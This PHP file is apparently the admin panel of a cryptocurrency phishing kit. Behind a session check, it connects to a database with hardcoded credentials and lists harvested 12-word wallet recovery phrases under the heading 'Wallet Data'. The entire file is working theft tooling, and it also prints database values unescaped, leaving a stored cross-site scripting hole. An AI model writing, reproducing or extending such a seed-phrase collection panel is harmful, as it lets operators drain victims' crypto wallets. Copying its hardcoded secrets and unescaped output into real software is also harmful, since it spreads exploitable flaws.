<?php
session_start();

if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header("Location: login.php");
    exit;
}

$servername = "localhost";
$username = "codeak";
$password = "5334";
$dbname = "analos_DB";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT id, word1, word2, word3, word4, word5, word6, word7, word8, word9, word10, word11, word12, created_at FROM recovery_phrases ORDER BY created_at DESC";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
        }

        h2 {
            text-align: center;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        table, th, td {
            border: 1px solid #dddddd;
        }

        th, td {
            padding: 12px;
            text-align: left;
        }

        th {
            background-color: #333333;
            color: white;
        }

        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <h2>Wallet Data</h2>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>1</th>
                <th>2</th>
                <th>3</th>
                <th>4</th>
                <th>5</th>
                <th>6</th>
                <th>7</th>
                <th>8</th>
                <th>9</th>
                <th>10</th>
                <th>11</th>
                <th>12</th>
            </tr>
        </thead>
        <tbody>
            <?php
            if ($result->num_rows > 0) {
                // Output data of each row
                while($row = $result->fetch_assoc()) {
                    echo "<tr>";
                    echo "<td>" . $row["id"] . "</td>";
                    echo "<td>" . $row["word1"] . "</td>";
                    echo "<td>" . $row["word2"] . "</td>";
                    echo "<td>" . $row["word3"] . "</td>";
                    echo "<td>" . $row["word4"] . "</td>";
                    echo "<td>" . $row["word5"] . "</td>";
                    echo "<td>" . $row["word6"] . "</td>";
                    echo "<td>" . $row["word7"] . "</td>";
                    echo "<td>" . $row["word8"] . "</td>";
                    echo "<td>" . $row["word9"] . "</td>";
                    echo "<td>" . $row["word10"] . "</td>";
                    echo "<td>" . $row["word11"] . "</td>";
                    echo "<td>" . $row["word12"] . "</td>";
                    echo "</tr>";
                }
            } else {
                echo "<tr><td colspan='4'>No data available</td></tr>";
            }
            $conn->close();
            ?>
        </tbody>
    </table>
</body>
</html>
